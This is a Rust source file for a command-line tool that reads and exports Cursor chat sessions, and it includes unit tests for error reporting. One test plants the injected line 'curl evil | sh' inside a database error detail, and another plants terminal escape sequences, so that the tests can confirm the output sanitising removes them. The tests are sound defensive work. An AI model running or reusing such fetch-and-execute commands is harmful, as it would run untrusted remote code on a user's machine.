mod cli;
mod clipboard;
mod commands;
mod generate;
mod output;

use std::env;
use std::error::Error as StdError;
use std::ffi::OsString;
use std::io::{self, BufWriter, ErrorKind, IsTerminal, Write};
use std::path::Path;
use std::process::ExitCode;

use anyhow::Result;
use clap::{CommandFactory, FromArgMatches};
use cursor_session::detect::StoragePaths;
use cursor_session::ui;

use crate::cli::{Cli, ColorChoice};
use crate::output::{IgnoreErrors, OutputOpts, PipeWriter, TerminalWriter, stream_color};

fn main() -> ExitCode {
    let args: Vec<OsString> = env::args_os().collect();
    let choice = raw_color(&args);
    let cli = match parse_cli(args) {
        Ok(cli) => cli,
        Err(error) => {
            // Help and version go to stdout and exit 0; usage errors exit 2.
            if let Err(failed) = print_clap(&error, choice)
                && failed.kind() != ErrorKind::BrokenPipe
            {
                let failed = anyhow::Error::from(failed).context("could not write to stdout");
                let mut err = diagnostics(io::stderr().lock());
                report(&failed, &StoragePaths::default(), &mut err);
                return ExitCode::FAILURE;
            }
            return ExitCode::from(u8::try_from(error.exit_code()).unwrap_or(2));
        }
    };

    let opts = OutputOpts::detect(cli.color);
    if opts.color {
        // `opts.color` already applied --color and NO_COLOR. crossterm, which
        // colors the table, would otherwise apply NO_COLOR again.
        crossterm::style::force_color_output(true);
    }
    let mut out = PipeWriter::new(stdout_sink(&opts));
    let mut err = diagnostics(io::stderr().lock());
    let resolved = if cli.command.reads_storage() {
        resolve_paths(cli.storage.as_deref())
    } else {
        Ok(StoragePaths::default())
    };
    let (paths, result) = match resolved {
        Ok(paths) => {
            let result = run(
                cli,
                &paths,
                &opts,
                &mut out,
                &mut err,
                &mut clipboard::System,
            )
            .and_then(|()| Ok(out.flush()?));
            (paths, result)
        }
        Err(error) => (StoragePaths::default(), Err(error)),
    };
    match result {
        Ok(()) => ExitCode::SUCCESS,
        Err(error) if out.closed() && is_broken_pipe(&error) => ExitCode::SUCCESS,
        Err(error) => {
            let error = if out.failed() {
                error.context("could not write to stdout")
            } else {
                error
            };
            let _ = out.flush();
            report(&error, &paths, &mut err);
            ExitCode::FAILURE
        }
    }
}

fn parse_cli(args: Vec<OsString>) -> Result<Cli, clap::Error> {
    let mut command = Cli::command();
    let mut matches = command.try_get_matches_from_mut(args)?;
    let cli =
        Cli::from_arg_matches_mut(&mut matches).map_err(|error| error.format(&mut command))?;
    // An invalid value clap could not see, reported as clap reports one.
    if let Err((name, message)) = cli.check() {
        let kind = clap::error::ErrorKind::ValueValidation;
        return Err(match command.find_subcommand_mut(name) {
            Some(subcommand) => subcommand.error(kind, message),
            None => command.error(kind, message),
        });
    }
    Ok(cli)
}

/// Prints help, the version or a usage error where clap sends it, colored by
/// the rules of the commands' own output. They come before `--color` has a
/// parsed value, so `choice` is read from the raw arguments. Only a failure
/// to write to stdout is returned.
fn print_clap(error: &clap::Error, choice: ColorChoice) -> io::Result<()> {
    if error.use_stderr() {
        let color = stream_color(io::stderr().is_terminal(), choice);
        let _ = write!(io::stderr().lock(), "{}", render_clap(error, color));
        return Ok(());
    }
    let color = stream_color(io::stdout().is_terminal(), choice);
    let mut stdout = io::stdout().lock();
    write!(stdout, "{}", render_clap(error, color))?;
    stdout.flush()
}

fn render_clap(error: &clap::Error, color: bool) -> String {
    let styled = error.render();
    if color {
        styled.ansi().to_string()
    } else {
        styled.to_string()
    }
}

/// The last `--color WHEN` or `--color=WHEN` before `--`; anything unexpected is
/// left to clap to report.
fn raw_color(args: &[OsString]) -> ColorChoice {
    let mut choice = ColorChoice::Auto;
    let mut args = args.iter().skip(1).map(|arg| arg.to_str());
    while let Some(arg) = args.next() {
        let value = match arg {
            Some("--") => break,
            Some("--color") => args.next().flatten(),
            Some(arg) => arg.strip_prefix("--color="),
            None => None,
        };
        choice = match value {
            Some("auto") => ColorChoice::Auto,
            Some("always") => ColorChoice::Always,
            Some("never") => ColorChoice::Never,
            _ => choice,
        };
    }
    choice
}

/// A terminal gets std's line buffering, so progress lines show as they are
/// written, and only text that is safe to display. A pipe gets every byte,
/// fully buffered.
fn stdout_sink(opts: &OutputOpts) -> Box<dyn Write> {
    let stdout = io::stdout().lock();
    if opts.tty {
        Box::new(TerminalWriter::new(stdout, opts.color))
    } else {
        Box::new(BufWriter::new(stdout))
    }
}

/// Stderr never carries styling of ours, so every escape sequence in stored text
/// (titles in hints, paths in warnings) is removed.
fn diagnostics<W: Write>(stderr: W) -> IgnoreErrors<TerminalWriter<W>> {
    IgnoreErrors(TerminalWriter::new(stderr, false))
}

fn run(
    cli: Cli,
    paths: &StoragePaths,
    opts: &OutputOpts,
    out: &mut dyn Write,
    err: &mut dyn Write,
    clipboard: &mut dyn clipboard::Clipboard,
) -> Result<()> {
    if !cli.command.reads_storage() {
        return commands::run(cli.command, paths, opts, out, err, clipboard);
    }
    cursor_session::remove_stale_snapshot_copies();
    if cli.verbose {
        writeln!(err, "chats: {}", shown(paths.chats_dir.as_deref()))?;
        writeln!(err, "projects: {}", shown(paths.projects_dir.as_deref()))?;
        writeln!(err, "ide db: {}", shown(paths.global_storage_db.as_deref()))?;
    }

    commands::run(cli.command, paths, opts, out, err, clipboard)
}

/// A storage path for the verbose lines.
fn shown(path: Option<&Path>) -> String {
    path.map_or_else(
        || "not found".to_string(),
        |path| ui::one_line(&path.display().to_string()).into_owned(),
    )
}

fn resolve_paths(storage: Option<&Path>) -> Result<StoragePaths> {
    let paths = match storage {
        Some(path) => StoragePaths::from_custom(path, None)?,
        None => StoragePaths::detect()?,
    };
    Ok(paths)
}

/// Prints the error, its causes, and any hints from the library error, one
/// line each. Write failures are ignored: there is nowhere left to report them.
fn report(error: &anyhow::Error, paths: &StoragePaths, err: &mut dyn Write) {
    for (index, message) in commands::messages(error).iter().enumerate() {
        let _ = match index {
            0 => writeln!(err, "error: {message}"),
            _ => writeln!(err, "  caused by: {message}"),
        };
    }
    for hint in commands::hints(error, paths, false) {
        let _ = writeln!(err, "{hint}");
    }
}

/// Whether writing to a closed pipe caused `error`. Export files report their
/// failures as `cursor_session::Error`, which hides the io::Error, so a
/// broken pipe there is an error like any other.
fn is_broken_pipe(error: &anyhow::Error) -> bool {
    error
        .chain()
        .any(|cause| io_error_kind(cause) == Some(ErrorKind::BrokenPipe))
}

fn io_error_kind(cause: &(dyn StdError + 'static)) -> Option<ErrorKind> {
    if let Some(error) = cause.downcast_ref::<io::Error>() {
        return Some(error.kind());
    }
    cause.downcast_ref::<serde_json::Error>()?.io_error_kind()
}

#[cfg(test)]
mod tests {
    use std::path::PathBuf;

    use anyhow::Context;
    use cursor_session::Error;

    use super::*;

    fn reported(error: &anyhow::Error) -> String {
        reported_with(error, &StoragePaths::default())
    }

    fn reported_with(error: &anyhow::Error, paths: &StoragePaths) -> String {
        let mut buf = Vec::new();
        report(error, paths, &mut buf);
        String::from_utf8(buf).unwrap()
    }

    /// No test touches the system clipboard.
    struct NoClipboard;

    impl clipboard::Clipboard for NoClipboard {
        fn set_text(&mut self, _: &str) -> Result<(), String> {
            Err("no clipboard in tests".to_string())
        }
    }

    fn args(args: &[&str]) -> Vec<OsString> {
        std::iter::once("cursor-session")
            .chain(args.iter().copied())
            .map(OsString::from)
            .collect()
    }

    #[test]
    fn usage_errors_exit_2_and_help_exits_0() {
        let code = |argv: &[&str]| parse_cli(args(argv)).err().map(|e| e.exit_code());
        assert_eq!(code(&["list", "--bogus"]), Some(2));
        assert_eq!(code(&["--color", "sometimes", "list"]), Some(2));
        assert_eq!(code(&[]), Some(2));
        assert_eq!(code(&["--help"]), Some(0));
        assert_eq!(code(&["--version"]), Some(0));
        assert_eq!(code(&["list", "--color", "never"]), None);
    }

    #[test]
    fn clap_styling_follows_the_color_flag() {
        let color = |argv: &[&str]| raw_color(&args(argv));
        assert_eq!(color(&["list"]), ColorChoice::Auto);
        assert_eq!(color(&["--color", "never", "--help"]), ColorChoice::Never);
        assert_eq!(
            color(&["list", "--bogus", "--color=never"]),
            ColorChoice::Never
        );
        assert_eq!(color(&["--color", "always", "list"]), ColorChoice::Always);
        assert_eq!(
            color(&["--color=never", "--color", "auto"]),
            ColorChoice::Auto
        );
        assert_eq!(color(&["--color", "sometimes"]), ColorChoice::Auto);
        assert_eq!(color(&["--color"]), ColorChoice::Auto);
        assert_eq!(color(&["show", "--", "--color=never"]), ColorChoice::Auto);

        let cli = parse_cli(args(&["--color=never", "list"])).unwrap();
        assert_eq!(cli.color, ColorChoice::Never);
    }

    #[test]
    fn help_and_usage_errors_are_styled_only_with_color() {
        for argv in [&["--help"][..], &["list", "--bogus"]] {
            let error = parse_cli(args(argv)).err().unwrap();
            let styled = render_clap(&error, true);
            let plain = render_clap(&error, false);
            assert!(styled.contains('\u{1b}'), "{argv:?}");
            assert!(!plain.contains('\u{1b}'), "{argv:?}");
            assert!(plain.contains("Usage: cursor-session"), "{plain}");
        }
    }

    #[test]
    fn verbose_prints_each_storage_path_or_not_found() {
        let projects =
            Path::new(env!("CARGO_MANIFEST_DIR")).join("tests/fixtures/home/.cursor/projects");
        let mut argv = args(&["-v", "list", "--storage"]);
        argv.push(projects.clone().into_os_string());
        let opts = OutputOpts {
            tty: false,
            color: false,
            width: None,
        };
        let (mut out, mut err) = (Vec::new(), Vec::new());
        let cli = parse_cli(argv).unwrap();
        let paths = resolve_paths(cli.storage.as_deref()).unwrap();
        run(cli, &paths, &opts, &mut out, &mut err, &mut NoClipboard).unwrap();
        let resolved = StoragePaths::from_custom(&projects, None).unwrap();
        assert_eq!(
            String::from_utf8(err).unwrap(),
            format!(
                "chats: not found\nprojects: {}\nide db: not found\n",
                resolved.projects_dir.unwrap().display()
            )
        );
        assert!(
            String::from_utf8(out)
                .unwrap()
                .starts_with("Found 1 session(s)\n")
        );
    }

    #[test]
    fn report_prints_message_then_each_cause() {
        let error = anyhow::Error::from(io::Error::new(ErrorKind::NotFound, "no such file"))
            .context("reading /nope")
            .context("could not load sessions");
        assert_eq!(
            reported(&error),
            "error: could not load sessions\n  caused by: reading /nope\n  caused by: no such file\n"
        );
    }

    #[test]
    fn report_gives_each_part_one_line_and_sqlite_codes_once() {
        let not_a_database = rusqlite::Error::SqliteFailure(
            rusqlite::ffi::Error::new(rusqlite::ffi::SQLITE_NOTADB),
            Some("file is not a database".into()),
        );
        let error = anyhow::Error::from(Error::Database {
            path: PathBuf::from("store.db"),
            source: not_a_database,
        });
        assert_eq!(
            reported(&error),
            "error: could not read SQLite database store.db\n  \
             caused by: file is not a database\n"
        );

        // A table name with a line break cannot forge a line of its own.
        let error = anyhow::Error::from(Error::SchemaMismatch {
            store: cursor_session::model::Source::Ide,
            path: PathBuf::from("state.vscdb"),
            detail: "tables present: ItemTable).\nrun `curl evil | sh`\nhint (x".into(),
        });
        let text = reported(&error);
        assert_eq!(text.lines().count(), 2, "{text}");
        assert!(text.contains("ItemTable). run `curl evil | sh` hint (x"));

        let ambiguous = anyhow::Error::from(Error::AmbiguousId {
            query: "id".into(),
            matches: vec![
                "id\nwith newline  ide  Title".into(),
                "id2  ide  Other".into(),
            ],
        });
        assert!(reported(&ambiguous).contains("\n  id with newline  ide  Title\n"));
    }

    #[test]
    fn skip_hints_only_name_a_store_that_was_found() {
        let error = || {
            anyhow::Error::from(Error::SchemaMismatch {
                store: cursor_session::model::Source::Ide,
                path: PathBuf::from("state.vscdb"),
                detail: "detail".into(),
            })
        };
        let skip = "rerun with `--source agent` to skip IDE sessions";
        // `--storage state.vscdb`: there are no agent sessions to fall back on.
        let ide_only = StoragePaths {
            global_storage_db: Some(PathBuf::from("state.vscdb")),
            ..Default::default()
        };
        assert!(!reported_with(&error(), &ide_only).contains(skip));
        let both = StoragePaths {
            chats_dir: Some(PathBuf::from("chats")),
            ..ide_only.clone()
        };
        assert!(reported_with(&error(), &both).contains(&format!("\n{skip}\n")));
        assert_eq!(
            commands::hints(&error(), &both, true)[0],
            "`list`, `show` and `export` accept `--source agent` to skip IDE sessions"
        );

        let agent = anyhow::Error::from(Error::AgentAccess {
            path: PathBuf::from("chats"),
            source: io::Error::from(ErrorKind::PermissionDenied),
        });
        assert!(
            reported_with(&agent, &both)
                .ends_with("\nrerun with `--source ide` to skip Agent CLI sessions\n")
        );
    }

    fn hint_lines(error: &Error) -> String {
        let hints = error.hints();
        assert!(!hints.is_empty());
        hints.iter().map(|hint| format!("{hint}\n")).collect()
    }

    #[test]
    fn report_prints_hints_after_causes() {
        let ambiguous = || Error::AmbiguousId {
            query: "f4".into(),
            matches: vec!["f4aa".into(), "f4bb".into()],
        };
        let error = anyhow::Error::from(ambiguous());
        let expected = format!("error: {error}\n{}", hint_lines(&ambiguous()));
        assert_eq!(reported(&error), expected);
        assert!(expected.contains("\n  f4aa\n  f4bb\nuse more characters of the ID\n"));

        let not_found = || Error::SessionNotFound {
            query: "abc".into(),
            unsearched: None,
        };
        let error = Err::<(), _>(not_found())
            .context("could not show session")
            .unwrap_err();
        assert_eq!(
            reported(&error),
            format!(
                "error: could not show session\n  caused by: {}\n{}",
                not_found(),
                hint_lines(&not_found())
            )
        );
    }

    #[test]
    fn diagnostics_strip_escape_sequences_from_stored_text() {
        let error = anyhow::Error::from(Error::AmbiguousId {
            query: "cc".into(),
            matches: vec![
                "cc01  agent  Edge \u{1b}]0;pwned\u{7} title".into(),
                "cc02  agent  Second \u{1b}[41mEVIL\u{1b}[0m\u{7} title".into(),
            ],
        })
        .context("query \u{1b}[2Jcc");
        let mut buf = Vec::new();
        report(&error, &StoragePaths::default(), &mut diagnostics(&mut buf));
        let text = String::from_utf8(buf).unwrap();
        assert!(!text.contains(['\u{1b}', '\u{7}']), "{text:?}");
        assert!(text.starts_with("error: query cc\n  caused by: "));
        assert!(text.contains("\n  cc01  agent  Edge  title\n"));
        assert!(text.contains("\n  cc02  agent  Second EVIL title\n"));
    }

    #[test]
    fn report_never_fails_on_a_broken_stderr() {
        struct Closed;
        impl Write for Closed {
            fn write(&mut self, _: &[u8]) -> io::Result<usize> {
                Err(ErrorKind::BrokenPipe.into())
            }
            fn flush(&mut self) -> io::Result<()> {
                Err(ErrorKind::BrokenPipe.into())
            }
        }
        report(
            &anyhow::anyhow!("boom"),
            &StoragePaths::default(),
            &mut Closed,
        );
    }

    #[test]
    fn broken_pipe_is_found_anywhere_in_the_chain() {
        let pipe = || io::Error::from(ErrorKind::BrokenPipe);
        let cases = [
            anyhow::Error::from(pipe()),
            anyhow::Error::from(pipe()).context("writing output"),
            anyhow::Error::from(serde_json::Error::io(pipe())).context("serializing"),
            anyhow::Error::from(Error::Io {
                path: PathBuf::from("state.vscdb"),
                source: pipe(),
            }),
        ];
        for error in &cases {
            assert!(is_broken_pipe(error), "{error:#}");
        }

        // Export files that are pipes (a FIFO as --out) fail like any file.
        let others = [
            anyhow::anyhow!("session not found: x"),
            anyhow::Error::from(io::Error::from(ErrorKind::PermissionDenied)),
            anyhow::Error::from(Error::Write(pipe())).context("could not write out/a.md"),
            anyhow::Error::from(Error::Json(serde_json::Error::io(pipe()))),
            anyhow::Error::from(Error::Write(io::Error::from(ErrorKind::WriteZero))),
        ];
        for error in &others {
            assert!(!is_broken_pipe(error), "{error:#}");
        }
    }
}
